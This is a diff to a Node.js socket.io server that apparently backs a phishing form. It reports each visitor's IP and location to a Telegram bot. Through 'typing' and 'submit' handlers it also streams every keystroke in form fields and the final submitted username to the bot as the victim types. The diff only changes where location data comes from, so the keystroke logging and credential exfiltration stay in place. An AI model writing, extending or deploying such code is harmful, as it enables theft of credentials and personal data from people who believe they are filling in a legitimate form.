@@ -23,53 +23,28 @@ function sendTelegram(message){
     }).catch(err => console.log("Telegram Error:", err.message));
 }
 
-async function getLocation(ip){
-    try{
-        const res = await axios.get(`https://ipapi.co/${ip}/json/`);
+io.on("connection",(socket)=>{
 
-        const city = res.data.city || "Unknown";
-        const region = res.data.region || "Unknown";
-        const country = res.data.country_name || "Unknown";
+    console.log("User connected");
 
-        return `${city}, ${region}, ${country}`;
-    }catch{
-        return "Unknown location";
-    }
-}
+    // Receive visitor info from frontend
+    socket.on("visitor-info",(data)=>{
 
-io.on("connection", async (socket)=>{
+        console.log("Visitor Data:", data);
 
-    console.log("User opened the form");
+        sendTelegram(`⚠️ New Visitor
+IP: ${data.ip}
+Location: ${data.city}, ${data.region}, ${data.country}`);
+    });
 
-    // Correct IP detection for Render proxy
-    let ip = socket.handshake.headers["x-forwarded-for"];
-
-    if(ip){
-        ip = ip.split(",")[0];
-    }else{
-        ip = socket.conn.remoteAddress;
-    }
-
-    if(ip){
-        ip = ip.replace("::ffff:", "");
-    }
-
-    console.log("Detected IP:", ip);
-
-    const location = await getLocation(ip);
-
-    console.log("Location:", location);
-
-    sendTelegram(`⚠️ New Visitor
-IP: ${ip}
-Location: ${location}`);
-
+    // typing tracking
     socket.on("typing",(data)=>{
         sendTelegram(`Typing
 Field: ${data.field}
 Value: ${data.value}`);
     });
 
+    // final form submit
     socket.on("submit",(data)=>{
         sendTelegram(`✅ Final Submission
 Username: ${data.username}
